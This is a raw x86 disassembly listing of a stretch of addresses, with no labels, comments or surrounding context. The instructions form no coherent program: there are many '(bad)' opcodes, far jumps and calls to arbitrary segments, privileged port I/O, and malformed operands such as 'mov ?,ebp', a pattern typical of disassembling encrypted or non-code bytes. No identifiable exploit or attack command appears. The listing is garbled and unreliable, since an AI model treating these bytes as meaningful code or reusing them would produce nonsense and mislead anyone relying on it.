  4047ba:	rol    DWORD PTR [esi],0x8a
  4047bd:	dec    esp
  4047be:	lods   al,BYTE PTR gs:[esi]
  4047c0:	shufps xmm7,XMMWORD PTR [edi],0x1a
  4047c4:	inc    ebp
  4047c5:	and    ch,dl
  4047c7:	ret    
  4047c8:	ins    BYTE PTR es:[edi],dx
  4047c9:	inc    eax
  4047ca:	or     ah,ch
  4047cc:	(bad)  
  4047ce:	xchg   ebx,eax
  4047cf:	sar    esp,cl
  4047d1:	xchg   ebp,eax
  4047d2:	out    0x29,al
  4047d4:	in     eax,dx
  4047d5:	mov    ah,0x78
  4047d7:	jne    0x404775
  4047d9:	sbb    eax,0x8ee26c9d
  4047de:	stc    
  4047df:	call   0x3f4f9db2
  4047e4:	xchg   edx,eax
  4047e5:	leave  
  4047e6:	scas   al,BYTE PTR es:[edi]
  4047e7:	mov    cl,0xb8
  4047e9:	arpl   WORD PTR [ecx+0x78],dx
  4047ec:	sub    cl,dh
  4047ee:	dec    eax
  4047ef:	mov    bh,0x6d
  4047f1:	mov    fs,WORD PTR [esi-0x52]
  4047f4:	inc    eax
  4047f5:	xor    dl,BYTE PTR [ecx+edx*2+0x7a]
  4047f9:	or     dh,bh
  4047fb:	icebp  
  4047fc:	jnp    0x40487c
  4047fe:	shl    BYTE PTR [eax-0x39da99bb],1
  404804:	sub    BYTE PTR [ebx+0x66e098cf],0x86
  40480b:	arpl   WORD PTR [esi+0xf],cx
  40480e:	sbb    al,BYTE PTR [ebp-0x6cc2f534]
  404814:	sub    bl,bh
  404816:	mov    edi,0x65170b66
  40481b:	in     eax,dx
  40481c:	addr16 adc eax,0x86fd34c2
  404822:	push   0xffffffad
  404824:	and    eax,0x8a2c3d6
  404829:	cmp    DWORD PTR [edx+0x26],ebx
  40482c:	xor    al,0xfb
  40482e:	or     ecx,DWORD PTR [edx]
  404830:	ret    
  404831:	aas    
  404832:	mov    bh,0x2d
  404834:	lahf   
  404835:	add    esp,DWORD PTR [edx]
  404837:	int3   
  404838:	pop    esi
  404839:	xchg   edi,eax
  40483a:	mov    edi,0x34dadd41
  40483f:	aaa    
  404840:	test   bl,0xe4
  404843:	cmp    eax,ebp
  404845:	jg     0x4047ec
  404847:	sub    BYTE PTR [eax*2+0x310918f1],cl
  40484e:	aaa    
  40484f:	fwait
  404850:	and    BYTE PTR [ebp-0x7c],ch
  404853:	pop    ds
  404854:	outs   dx,BYTE PTR ds:[esi]
  404855:	(bad)  
  404856:	mov    bh,0x1
  404858:	jecxz  0x404802
  40485a:	cld    
  40485b:	ins    DWORD PTR es:[edi],dx
  40485c:	ficomp WORD PTR [esi]
  40485e:	fwait
  40485f:	xchg   esp,eax
  404860:	test   DWORD PTR [esp+edx*4-0x30],esp
  404864:	cmp    DWORD PTR [ecx-0x7124670],edi
  40486a:	retf   0xb352
  40486d:	adc    DWORD PTR ds:0x187017f4,esp
  404873:	jns    0x404864
  404875:	mov    ecx,0xb90880bd
  40487a:	lods   al,BYTE PTR ds:[esi]
  40487b:	sub    eax,0x24b4fab4
  404880:	mov    BYTE PTR [esi],0x10
  404883:	mov    dl,0xd9
  404885:	mov    ebx,0xe71ffed2
  40488a:	adc    al,0xf9
  40488c:	mov    eax,0x63085109
  404891:	vpmuludq ymm5,ymm5,ymm7
  404895:	push   cs
  404896:	inc    edx
  404897:	sub    ah,BYTE PTR [edi+0x14]
  40489a:	pop    ebp
  40489b:	rcl    DWORD PTR [edx+0x3],0x54
  40489f:	(bad)  
  4048a1:	adc    al,0xf6
  4048a3:	jecxz  0x404877
  4048a5:	jmp    0x5b:0xfb365a87
  4048ac:	push   cs
  4048ad:	leave  
  4048ae:	mov    ah,0x74
  4048b0:	rcl    bh,cl
  4048b2:	dec    edi
  4048b3:	mov    al,0x3f
  4048b5:	or     ebx,DWORD PTR [edi-0x8]
  4048b8:	lock dec ecx
  4048ba:	cwde   
  4048bb:	popf   
  4048bc:	push   0x4fc9cacc
  4048c1:	dec    esi
  4048c2:	clc    
  4048c3:	das    
  4048c4:	and    al,0x41
  4048c6:	std    
  4048c7:	jecxz  0x404865
  4048c9:	scas   eax,DWORD PTR es:[edi]
  4048ca:	jp     0x404928
  4048cc:	push   esp
  4048cd:	leave  
  4048ce:	(bad)  
  4048cf:	dec    esi
  4048d0:	and    eax,0x5a19a6fa
  4048d5:	jmp    0xb50d98b8
  4048da:	push   edx
  4048db:	mov    ds:0x7921daf4,al
  4048e0:	xchg   ebx,eax
  4048e1:	xor    DWORD PTR [eax+0x3080975d],ecx
  4048e7:	or     DWORD PTR [eax],esp
  4048e9:	pop    edi
  4048ea:	cmp    al,0x5d
  4048ec:	and    al,0x70
  4048ee:	lock lahf 
  4048f0:	lods   al,BYTE PTR ds:[esi]
  4048f1:	add    al,0x53
  4048f3:	mov    edi,0x3ba1f4e4
  4048f8:	jp     0x404908
  4048fa:	xor    BYTE PTR [esi+edx*2+0x651e2efc],0x22
  404902:	or     bh,cl
  404904:	mov    al,0x10
  404906:	dec    ebp
  404907:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404908:	inc    ebx
  404909:	dec    eax
  40490a:	(bad)  
  40490b:	mov    esi,0x5241d1c5
  404910:	push   0x76
  404912:	cmp    al,0x60
  404914:	jmp    0x404992
  404916:	shl    DWORD PTR [ecx],cl
  404918:	pop    es
  404919:	nop
  40491a:	or     al,ch
  40491c:	test   eax,0x3ade0b27
  404921:	stc    
  404922:	xchg   esp,eax
  404923:	mov    dl,0x5f
  404925:	stos   BYTE PTR es:[edi],al
  404926:	icebp  
  404927:	mov    DWORD PTR [edi],eax
  404929:	test   eax,0xac64774e
  40492e:	mov    al,ds:0xc8b9d18
  404933:	pop    ds
  404934:	xchg   edx,eax
  404935:	xor    BYTE PTR [ecx],dl
  404937:	pop    ds
  404938:	out    0x67,eax
  40493a:	inc    ecx
  40493b:	mov    eax,ds:0x48a99167
  404940:	popf   
  404941:	cmp    DWORD PTR [ebp+esi*1+0x2b6350ae],0x5e6c080d
  40494c:	push   esi
  40494d:	dec    eax
  40494e:	das    
  40494f:	mov    bh,0x95
  404951:	outs   dx,BYTE PTR ds:[esi]
  404952:	packsswb mm0,QWORD PTR [esi-0x3b]
  404956:	adc    edi,esp
  404958:	add    DWORD PTR [edx+0x3567a3b7],esp
  40495e:	dec    edi
  40495f:	mov    dl,0x21
  404961:	stos   DWORD PTR es:[edi],eax
  404962:	jp     0x4049d1
  404964:	push   0xffffffc0
  404966:	cmc    
  404967:	xchg   ebx,eax
  404968:	rol    ebp,0xb2
  40496b:	ds mov bh,0xc7
  40496e:	sbb    esi,eax
  404970:	stc    
  404971:	add    dl,0x33
  404974:	and    eax,0x59530498
  404979:	popf   
  40497a:	or     al,dh
  40497c:	mov    bh,0x86
  40497e:	sbb    dh,BYTE PTR [edi]
  404980:	mov    ds:0x9016ecc9,eax
  404985:	push   eax
  404986:	mov    ds:0xe555ce62,eax
  40498b:	pop    ds
  40498c:	push   ebx
  40498d:	add    DWORD PTR [ebx+ecx*8-0x33],edi
  404991:	sub    bh,bh
  404993:	push   ebp
  404994:	xor    al,0x84
  404996:	lods   eax,DWORD PTR ds:[esi]
  404997:	mov    dh,0xec
  404999:	lock ja 0x404933
  40499c:	adc    DWORD PTR [edx-0x4],eax
  40499f:	out    0x5,eax
  4049a1:	ds or  eax,0x906a5a59
  4049a7:	(bad)  
  4049a8:	push   ss
  4049a9:	in     al,dx
  4049aa:	out    0x6a,eax
  4049ac:	scas   al,BYTE PTR es:[edi]
  4049ad:	pop    es
  4049ae:	in     al,0xaf
  4049b0:	iret   
  4049b1:	not    edi
  4049b3:	dec    esp
  4049b4:	cmp    BYTE PTR [edx-0xb],bl
  4049b7:	ins    BYTE PTR es:[edi],dx
  4049b8:	push   edx
  4049b9:	outs   dx,BYTE PTR ds:[esi]
  4049ba:	cmp    al,BYTE PTR [edx]
  4049bc:	fsubr  st(0),st
  4049be:	dec    edi
  4049bf:	push   edx
  4049c0:	xchg   edx,eax
  4049c1:	inc    edx
  4049c2:	and    al,0x4d
  4049c4:	icebp  
  4049c5:	and    bl,ah
  4049c7:	lods   al,BYTE PTR ds:[esi]
  4049c8:	jle    0x40498e
  4049ca:	or     eax,0xceab6a0
  4049cf:	popa   
  4049d0:	mov    ch,0xc6
  4049d2:	shr    cl,cl
  4049d4:	cmp    al,0x40
  4049d6:	sbb    edi,esi
  4049d8:	xchg   ecx,eax
  4049d9:	xchg   edx,eax
  4049da:	stc    
  4049db:	jae    0x4049b0
  4049dd:	jle    0x4049df
  4049df:	push   cs
  4049e0:	icebp  
  4049e1:	sahf   
  4049e2:	outs   dx,BYTE PTR ds:[esi]
  4049e3:	jl     0x4049ed
  4049e5:	inc    ebp
  4049e6:	ja     0x404973
  4049e8:	xlat   BYTE PTR ds:[ebx]
  4049e9:	gs ins DWORD PTR es:[edi],dx
  4049eb:	into   
  4049ec:	repnz nop
  4049ee:	push   ebx
  4049ef:	sbb    DWORD PTR [edx+0x90d4f90],edi
  4049f5:	out    0x15,al
  4049f7:	mov    dh,0xd
  4049f9:	iret   
  4049fa:	js     0x4049e2
  4049fc:	push   esp
  4049fd:	retf   
  4049fe:	pop    ebx
  4049ff:	mov    dl,0xb
  404a01:	fucomi st,st(2)
  404a03:	pop    esi
  404a04:	leave  
  404a05:	aam    0x4e
  404a07:	ja     0x404a6b
  404a09:	inc    esi
  404a0a:	jne    0x4049e5
  404a0c:	out    0x7b,eax
  404a0e:	mov    WORD PTR [esi],ds
  404a10:	xchg   edi,eax
  404a11:	cmp    eax,0xbf274b56
  404a16:	out    0x34,al
  404a18:	imul   eax,DWORD PTR [esi+0x7b],0x44aba575
  404a1f:	cwde   
  404a20:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404a21:	inc    eax
  404a22:	or     BYTE PTR [edi-0x194b2ac0],0xf3
  404a29:	stc    
  404a2a:	outs   dx,DWORD PTR ds:[esi]
  404a2b:	pop    ebx
  404a2c:	mov    dl,0xac
  404a2e:	scas   al,BYTE PTR es:[edi]
  404a2f:	call   0x2c61306a
  404a34:	mov    esp,0x4d38e6b7
  404a39:	pop    ds
  404a3a:	fsubr  st,st(7)
  404a3c:	cld    
  404a3d:	dec    ebx
  404a3e:	mov    dh,0x76
  404a40:	es repz js 0x404a1e
  404a44:	hlt    
  404a45:	fst    DWORD PTR [eax-0xf6749c7]
  404a4b:	jg     0x4049cf
  404a4d:	push   es
  404a4e:	pusha  
  404a4f:	pusha  
  404a50:	(bad)  
  404a51:	outs   dx,DWORD PTR ds:[esi]
  404a52:	pushf  
  404a53:	dec    edx
  404a54:	sar    DWORD PTR [esi-0x76bc6699],cl
  404a5a:	jmp    0x404a6c
  404a5c:	inc    ebx
  404a5d:	or     al,0x49
  404a5f:	popf   
  404a60:	stos   DWORD PTR es:[edi],eax
  404a61:	sbb    eax,0xce49c4ce
  404a66:	cdq    
  404a67:	and    DWORD PTR [edx-0x2cf0adad],esi
  404a6d:	jp     0x404ae5
  404a6f:	sbb    bl,cl
  404a71:	mov    DWORD PTR [ecx-0x54a73f78],ebp
  404a77:	push   esp
  404a78:	inc    ebp
  404a79:	mov    al,0x51
  404a7b:	xor    eax,0xe4f75be9
  404a80:	sub    ebp,DWORD PTR [esi-0x43]
  404a83:	xchg   edx,eax
  404a84:	cmp    cl,BYTE PTR [ecx+0x15]
  404a87:	dec    esp
  404a88:	jbe    0x404a95
  404a8a:	fcom   DWORD PTR [ecx+eax*2]
  404a8d:	mov    al,ds:0x42aba3cf
  404a92:	test   DWORD PTR [ebx-0x68],ebx
  404a95:	push   edx
  404a96:	inc    ebx
  404a97:	push   edx
  404a98:	retf   0x14b4
  404a9b:	adc    eax,0x93557aff
  404aa0:	(bad)  
  404aa1:	fdivr  QWORD PTR [edi-0x61]
  404aa4:	test   DWORD PTR [edi+0x261d2f8a],esi
  404aaa:	out    dx,eax
  404aab:	xchg   edi,eax
  404aac:	(bad)  
  404aad:	stc    
  404aae:	pushf  
  404aaf:	mov    ds:0xdd4e0dc3,eax
  404ab4:	cdq    
  404ab5:	lods   eax,DWORD PTR ds:[esi]
  404ab6:	mov    esi,0x6568b4a3
  404abb:	push   esp
  404abc:	mov    eax,0xcdeac6c2
  404ac1:	sbb    al,0xa2
  404ac3:	adc    ah,dh
  404ac5:	inc    ebx
  404ac6:	adc    al,0x65
  404ac8:	lods   eax,DWORD PTR ds:[esi]
  404ac9:	test   DWORD PTR [eax+0xf3f161c],0x1a224f93
  404ad3:	sti    
  404ad4:	mov    edi,0x1436901b
  404ad9:	xor    DWORD PTR [eax-0x3b],0x91a7fa41
  404ae0:	mov    edi,0x9a96e6
  404ae5:	sahf   
  404ae6:	jmp    0xe03e:0x81ca62bf
  404aed:	mov    esp,0xd06db65d
  404af2:	mov    ebx,0x5e299fd9
  404af7:	fwait
  404af8:	jmp    0x830ae379
  404afd:	loopne 0x404b2f
  404aff:	ror    edi,0xaf
  404b02:	dec    edx
  404b03:	jmp    0x404b31
  404b05:	sub    BYTE PTR [ecx+0x7d53c13f],dh
  404b0b:	std    
  404b0c:	xchg   dl,ch
  404b0e:	xchg   DWORD PTR [esi+eiz*8-0x6b],esi
  404b12:	dec    edx
  404b13:	shr    esi,0x4f
  404b16:	mov    WORD PTR [eax-0x2f],es
  404b19:	push   ss
  404b1a:	call   0xbe81:0xe08c8fec
  404b21:	pop    ebx
  404b22:	rol    DWORD PTR [eax+eiz*1-0x684f7ad3],cl
  404b29:	mov    esp,0x4ced2133
  404b2e:	cmp    esp,DWORD PTR [esp+esi*2+0x70]
  404b32:	cli    
  404b33:	std    
  404b34:	inc    ebp
  404b35:	mov    edx,0x892a1e3b
  404b3a:	push   ds
  404b3b:	jp     0x404b64
  404b3d:	pop    ecx
  404b3e:	dec    edi
  404b3f:	sbb    ebx,edi
  404b41:	pop    ebp
  404b42:	leave  
  404b43:	mov    ah,0xff
  404b45:	jmp    0x8d3413b5
  404b4a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404b4b:	cmp    al,0x61
  404b4d:	lock retf 0x758e
  404b51:	in     al,dx
  404b52:	add    esp,edx
  404b54:	xchg   BYTE PTR [edx+0x22],bl
  404b57:	add    al,0x87
  404b59:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404b5a:	sbb    al,0x2f
  404b5c:	retf   
  404b5d:	push   edi
  404b5e:	test   eax,0xcba9e985
  404b63:	sub    dh,ch
  404b65:	jmp    0x77b08a9c
  404b6a:	scas   eax,DWORD PTR es:[edi]
  404b6b:	mov    ds:0x18f9360c,eax
  404b70:	and    DWORD PTR [ebx-0x69e0e555],edx
  404b76:	stc    
  404b77:	mov    ebp,db7
  404b7a:	mov    esi,ecx
  404b7c:	outs   dx,DWORD PTR ds:[esi]
  404b7d:	jno    0x404b6c
  404b7f:	lahf   
  404b80:	leave  
  404b81:	mov    ds:0xaa3a96cc,eax
  404b86:	add    edx,DWORD PTR ss:[edi]
  404b89:	scas   al,BYTE PTR es:[edi]
  404b8a:	fprem1 
  404b8c:	js     0x404b29
  404b8e:	icebp  
  404b8f:	cmc    
  404b90:	sbb    BYTE PTR [ebp-0x31b69a78],bh
  404b96:	sub    ecx,edi
  404b98:	jo     0x404b5a
  404b9a:	cs aas 
  404b9c:	gs dec edi
  404b9e:	je     0x404c02
  404ba0:	xor    dl,dh
  404ba2:	ins    DWORD PTR es:[edi],dx
  404ba3:	sbb    BYTE PTR [edx-0x46],bh
  404ba6:	pop    ds
  404ba7:	arpl   WORD PTR [ecx-0x80],di
  404baa:	jge    0x404c09
  404bac:	or     esp,esi
  404bae:	fs loope 0x404b52
  404bb1:	push   ebx
  404bb2:	call   FWORD PTR [ebp+0x6dabeb1e]
  404bb8:	sar    BYTE PTR [edi-0x4a],0x7e
  404bbc:	pop    ds
  404bbd:	add    dh,dh
  404bbf:	pop    ss
  404bc0:	push   esi
  404bc1:	out    0xab,eax
  404bc3:	xor    ebp,DWORD PTR [ecx]
  404bc5:	retf   
  404bc6:	dec    edi
  404bc7:	add    al,0x82
  404bc9:	inc    edx
  404bca:	fsub   QWORD PTR [esi-0x27]
  404bcd:	jp     0x404bfa
  404bcf:	sbb    al,BYTE PTR [ebx+0x49acd8d8]
  404bd5:	div    DWORD PTR [edx+0x4d71ffd0]
  404bdb:	inc    esp
  404bdc:	xor    dh,BYTE PTR [edi-0x5dc45613]
  404be2:	dec    edi
  404be3:	rcl    DWORD PTR [ebx+ebx*8],1
  404be6:	jo     0x404c1f
  404be8:	xchg   ecx,eax
  404be9:	pop    ebp
  404bea:	shr    BYTE PTR [edx],cl
  404bec:	in     al,0x1d
  404bee:	aaa    
  404bef:	mov    al,ds:0xf85b433b
  404bf4:	int    0x1e
  404bf6:	data16 xor ah,BYTE PTR [eax-0x3d]
  404bfa:	sbb    ebp,ebx
  404bfc:	jno    0x404b99
  404bfe:	sub    edi,DWORD PTR [ebx]
  404c00:	push   esp
  404c01:	fs inc ecx
  404c03:	push   0xac5c0011
  404c08:	add    DWORD PTR [ebx+0xa],esi
  404c0b:	jmp    0x57dc:0x8d5d18b1
  404c12:	pop    edx
  404c13:	xchg   esi,eax
  404c14:	dec    esp
  404c15:	dec    edi
  404c16:	stc    
  404c17:	add    edi,esp
  404c19:	dec    esp
  404c1a:	cli    
  404c1b:	mov    eax,ds:0x95c2e784
  404c20:	inc    esp
  404c21:	adc    al,0x8a
  404c23:	xchg   esi,eax
  404c24:	xor    ch,BYTE PTR [ebp-0x7a5426b5]
  404c2a:	jmp    0x404c69
  404c2c:	mov    esi,0xe8b2cd2
  404c31:	fild   QWORD PTR [edi]
  404c33:	sbb    al,BYTE PTR [eax]
  404c35:	dec    ebx
  404c36:	test   eax,0x564c33b
  404c3b:	pop    esp
  404c3c:	out    dx,eax
  404c3d:	lock mov bl,0x31
  404c40:	repz es mov ch,0x50
  404c44:	sti    
  404c45:	cli    
  404c46:	mov    bh,0xa6
  404c48:	pop    ss
  404c49:	aaa    
  404c4a:	mov    cl,0xce
  404c4c:	dec    eax
  404c4d:	hlt    
  404c4e:	shr    BYTE PTR [ebx+0xd],1
  404c51:	out    dx,al
  404c52:	call   0xedf095df
  404c57:	xor    cl,BYTE PTR [ebp+0x18]
  404c5a:	les    ebp,FWORD PTR [ebx-0x1a]
  404c5d:	jmp    0x819e2608
  404c62:	clc    
  404c63:	mov    esp,0x50eccbad
  404c68:	(bad)  
  404c69:	add    eax,0xbaae831e
  404c6e:	sub    cl,BYTE PTR ds:[ebx+edx*2+0xe]
  404c73:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404c74:	fsub   DWORD PTR [ecx-0x3]
  404c77:	lods   al,BYTE PTR ds:[esi]
  404c78:	pop    esp
  404c79:	stos   BYTE PTR es:[edi],al
  404c7a:	rcl    dh,1
  404c7c:	inc    eax
  404c7d:	jnp    0x404cbf
  404c7f:	aam    0x37
  404c81:	sub    al,0x96
  404c83:	ror    DWORD PTR [ebx+0x3bae86f2],1
  404c89:	cmp    esp,DWORD PTR [edx]
  404c8b:	mov    bh,ah
  404c8d:	jmp    0x4d5e:0x566f5b37
  404c94:	addr16 jb 0x404c3a
  404c97:	sub    al,BYTE PTR [esi+0x72e07aee]
  404c9d:	cmp    BYTE PTR [edi],bl
  404c9f:	sbb    BYTE PTR fs:[ebp-0x6f],bl
  404ca3:	mov    ecx,0x652d8fb3
  404ca8:	fs sti 
  404caa:	mov    cl,0xd0
  404cac:	xor    dh,BYTE PTR [ebp-0x6f552457]
  404cb2:	mov    ss,WORD PTR ds:0xaec29f16
  404cb8:	js     0x404c9c
  404cba:	int    0x37
  404cbc:	mov    WORD PTR [eax],ss
  404cbe:	or     dl,dh
  404cc0:	mov    ch,0x9a
  404cc2:	sti    
  404cc3:	sar    BYTE PTR [ecx-0x4a],1
  404cc6:	in     eax,dx
  404cc7:	daa    
  404cc8:	fwait
  404cc9:	out    0x54,al
  404ccb:	(bad)  
  404ccc:	std    
  404ccd:	fmul   QWORD PTR [edx-0x5a]
  404cd0:	jb     0x404d31
  404cd2:	push   ecx
  404cd3:	fbld   TBYTE PTR [edx]
  404cd5:	mov    bl,0xd
  404cd7:	iret   
  404cd8:	outs   dx,BYTE PTR ds:[esi]
  404cd9:	call   0xd152e3da
  404cde:	dec    edx
  404cdf:	xor    eax,0x99400ea1
  404ce4:	and    al,0xdb
  404ce6:	fsubp  st(4),st
  404ce8:	sbb    dh,0x11
  404ceb:	in     al,dx
  404cec:	sti    
  404ced:	repz mov al,0x94
  404cf0:	daa    
  404cf1:	jmp    0x3dc17b3d
  404cf6:	(bad)  
  404cf7:	ins    DWORD PTR es:[edi],dx
  404cf8:	add    DWORD PTR [edi+esi*4+0x5a],0x916b4786
  404d00:	mov    bl,0x29
  404d02:	sub    BYTE PTR [eax+0x45],0x37
  404d06:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404d07:	adc    BYTE PTR [esi-0x34],0x3f
  404d0b:	jnp    0x404d78
  404d0d:	mov    cl,0x2d
  404d0f:	iret   
  404d10:	ins    BYTE PTR es:[edi],dx
  404d11:	sbb    eax,0xc1a1f078
  404d16:	je     0x404d6a
  404d18:	sbb    BYTE PTR [eax+0x59],dh
  404d1b:	add    esi,DWORD PTR [bx+0x22]
  404d1f:	xchg   ebx,eax
  404d20:	shl    al,0x4
  404d23:	mov    WORD PTR [ecx+ecx*4],?
  404d26:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404d27:	enter  0x3e08,0xea
  404d2b:	or     dl,ah
  404d2d:	inc    ecx
  404d2e:	fst    QWORD PTR [ecx+0x4d7a9a77]
  404d34:	mov    dl,0x3e
  404d36:	xor    BYTE PTR [ebp-0x35],dh
  404d39:	into   
  404d3a:	sbb    DWORD PTR [eax-0x6f],esp
  404d3d:	stc    
  404d3e:	sub    DWORD PTR [ebx+0x6],eax
  404d41:	and    DWORD PTR [ecx-0x1af0b8d],0xba189395
  404d4b:	cmp    eax,0xa237b2d7
  404d50:	js     0x404d07
  404d52:	push   ebx
  404d53:	pop    esp
  404d54:	fadd   DWORD PTR [esi-0x6c]
  404d57:	mov    ebp,0x7a8b3a05
  404d5c:	dec    ebx
  404d5d:	js     0x404d21
  404d5f:	sub    eax,0x2cb7bfc8
  404d64:	loopne 0x404da7
  404d66:	fwait
  404d67:	js     0x404d59
  404d69:	push   cs
  404d6a:	lds    ebx,FWORD PTR [ebp-0x4d]
  404d6d:	dec    ebp
  404d6e:	lock mov cl,0xb1
  404d71:	xchg   edx,eax
  404d72:	popa   
  404d73:	xchg   esi,eax
  404d74:	and    BYTE PTR [ecx+0x7192052d],ch
  404d7a:	enter  0xb569,0xac
  404d7e:	mov    cl,0x59
  404d80:	jo     0x404d59
  404d82:	sub    DWORD PTR [ebp-0x60],esp
  404d85:	pop    ds
  404d86:	mov    al,ds:0xa4a5d886
  404d8b:	stos   DWORD PTR es:[edi],eax
  404d8c:	fsubr  DWORD PTR [esi-0x4c]
  404d8f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404d90:	xchg   ebx,eax
  404d91:	stc    
  404d92:	xchg   esi,eax
  404d93:	sub    DWORD PTR [ebp+0x5a],ebx
  404d96:	xchg   BYTE PTR [edx+0x26],bh
  404d99:	push   esp
  404d9a:	ja     0x404d6c
  404d9c:	add    dh,BYTE PTR [esi+edi*8+0x11]
  404da0:	shr    BYTE PTR [ebx-0x5ee8b37c],0x3d
  404da7:	aaa    
  404da8:	xor    ah,BYTE PTR [ecx+0x5a322b6b]
  404dae:	mov    eax,ds:0xe81fbd6c
  404db3:	mov    esp,0xe4025554
  404db8:	mov    al,ds:0x90224b9b
  404dbd:	mov    WORD PTR [ecx+0x33e6ba8b],es
  404dc3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404dc4:	test   eax,0xdcbfb003
  404dc9:	push   ecx
  404dca:	jbe    0x404d4f
  404dcc:	cwde   
  404dcd:	mov    ch,BYTE PTR [edi+0x6]
  404dd0:	mov    al,0xb9
  404dd2:	jecxz  0x404d6a
  404dd4:	add    BYTE PTR [ebp-0x6bb3a982],0x8c
  404ddb:	aam    0xb1
  404ddd:	push   0x740c93dc
  404de2:	xchg   DWORD PTR [eax+edi*4-0x11fce880],edi
  404de9:	xchg   edi,eax
  404dea:	out    dx,al
  404deb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404dec:	mov    ?,ebp
  404dee:	jmp    0x404e18
  404df0:	fist   DWORD PTR [ebp+0x7]
  404df3:	and    eax,0xf4295025
  404df8:	fxtract 
  404dfa:	ret    
  404dfb:	cdq    
  404dfc:	rol    DWORD PTR [ebx-0x49],cl
  404dff:	pop    edx
  404e00:	xchg   ecx,eax
  404e01:	or     DWORD PTR cs:[ebx+0x11],0xfffffff0
  404e06:	data16 add al,0x5b
  404e09:	xchg   ebx,eax
  404e0a:	add    bl,dh
  404e0c:	inc    ebx
  404e0d:	sti    
  404e0e:	call   0xb597:0xdc3336e5
  404e15:	xor    BYTE PTR [edx],al
  404e17:	pop    eax
  404e18:	push   0x732ae67b
  404e1d:	adc    esp,ebx
  404e1f:	xor    edi,DWORD PTR [edi-0x40]
  404e22:	jbe    0x404dbb
  404e24:	mov    ebx,0xf2bbcfd0
  404e29:	loop   0x404ea2
  404e2b:	pop    esp
  404e2c:	xchg   ebp,eax
  404e2d:	dec    ecx
  404e2e:	repnz lods eax,DWORD PTR ds:[esi]
  404e30:	mov    ds:0xf5711bab,al
  404e35:	push   edx
  404e36:	mov    dh,0x7d
  404e38:	add    esp,DWORD PTR [esi+0x20b91b36]
  404e3e:	adc    esi,DWORD PTR [edx]
  404e40:	pop    edx
  404e41:	or     DWORD PTR [ebx-0x2f66e9e2],edi
  404e47:	enter  0xfba7,0xd3
  404e4b:	mov    DWORD PTR [ecx+0x56],eax
  404e4e:	pusha  
  404e4f:	retf   
  404e50:	jge    0x404ea0
  404e52:	stc    
  404e53:	jmp    0x5e75b9dc
  404e58:	scas   al,BYTE PTR es:[edi]
  404e59:	mov    edi,0x9ebc2e60
  404e5e:	test   DWORD PTR [edx+0x24],esp
  404e61:	mov    esi,0xb33f0eae
  404e66:	shl    DWORD PTR [ebx+0x38],cl
  404e69:	lods   eax,DWORD PTR ds:[esi]
  404e6a:	mov    esp,0xb1514114
  404e6f:	lods   al,BYTE PTR ds:[esi]
  404e70:	nop
  404e71:	sub    ch,al
  404e73:	lea    ecx,[esi-0x6d8683c0]
  404e79:	push   eax
  404e7a:	jg     0x404e76
  404e7c:	(bad)  
  404e7e:	test   eax,0x6ea06d7f
  404e83:	rcl    BYTE PTR ds:0x3013df25,0x27
  404e8a:	(bad)  
  404e8b:	inc    ebx
  404e8c:	and    eax,0xacf1193f
  404e91:	xor    al,0xb
  404e93:	mov    esi,0x399737fe
  404e98:	push   ecx
  404e99:	repz cwde 
  404e9b:	xchg   edx,eax
  404e9c:	xor    ecx,DWORD PTR [edx+0x68d5b63]
  404ea2:	cwde   
  404ea3:	jmp    0x404e47
  404ea5:	out    dx,al
  404ea6:	shr    DWORD PTR [esi-0x74],0xef
  404eaa:	add    edx,0xffffffd0
  404ead:	lods   eax,DWORD PTR ds:[esi]
  404eae:	push   ebp
  404eaf:	in     eax,dx
  404eb0:	mov    es,WORD PTR [ecx-0x629ac061]
  404eb6:	sub    al,0xaf
  404eb8:	ret    
  404eb9:	and    al,0x34
  404ebb:	ss xchg edi,eax
  404ebd:	es pop edx
  404ebf:	shl    BYTE PTR [edi+0x2d98af16],0x43
  404ec6:	les    ebx,FWORD PTR [edi-0x29]
  404ec9:	mov    edi,0xf1d62e1
  404ece:	sbb    bl,BYTE PTR [ecx-0xefaeee1]
  404ed4:	mov    BYTE PTR [ecx-0x38b0ff94],ah
  404eda:	shl    DWORD PTR [ecx],cl
  404edc:	jmp    0xe24f:0xa00629cd
  404ee3:	sub    eax,0x1e7dbff2
  404ee8:	and    ecx,DWORD PTR [ebp-0x7473fa42]
  404eee:	xor    edi,0x26
  404ef1:	jb     0x404f3d
  404ef3:	ret    0x30f4
  404ef6:	(bad)  
  404ef7:	mov    ch,0x64
  404ef9:	add    ebx,DWORD PTR [ecx+0x66b5afd1]
  404eff:	gs jno 0x404ed3
  404f02:	iret   
  404f03:	mov    ch,0xd5
  404f05:	test   ch,ah
  404f07:	mov    dh,0x39
  404f09:	shr    BYTE PTR [edi+eax*8],1
  404f0c:	in     eax,dx
  404f0d:	pop    ebp
  404f0e:	out    dx,eax
  404f0f:	cmp    eax,0x57448db3
  404f14:	push   ebx
  404f15:	jns    0x404f92
  404f17:	add    edx,DWORD PTR [eax+eiz*8-0x31]
  404f1b:	mov    ebp,0x8f6fcd2b
  404f20:	adc    BYTE PTR [esi+eax*8+0x7b],al
  404f24:	aas    
  404f25:	or     DWORD PTR [ebx+0x64790a5f],eax
  404f2b:	dec    edx
  404f2c:	sbb    DWORD PTR ss:[ebx],edi
  404f2f:	inc    eax
  404f30:	fs int3 
  404f32:	fsub   DWORD PTR [ecx-0x41f61e7e]
  404f38:	aas    
  404f39:	cmp    BYTE PTR [edi-0x58],ch
  404f3c:	jns    0x404ef4
  404f3e:	pop    es
  404f3f:	pop    edi
  404f40:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404f41:	push   edi
  404f42:	loop   0x404f84
  404f44:	mov    ebx,0x36467ef8
  404f49:	mov    eax,0x44505e5
  404f4e:	into   
  404f4f:	fild   DWORD PTR [ebx]
  404f51:	stos   DWORD PTR es:[edi],eax
  404f52:	fisttp QWORD PTR [edx+0x6]
  404f55:	test   al,0x26
  404f57:	or     ch,BYTE PTR [ebx+0x2f961f1e]
  404f5d:	mov    ebx,0x8174e3f8
  404f62:	add    eax,edi
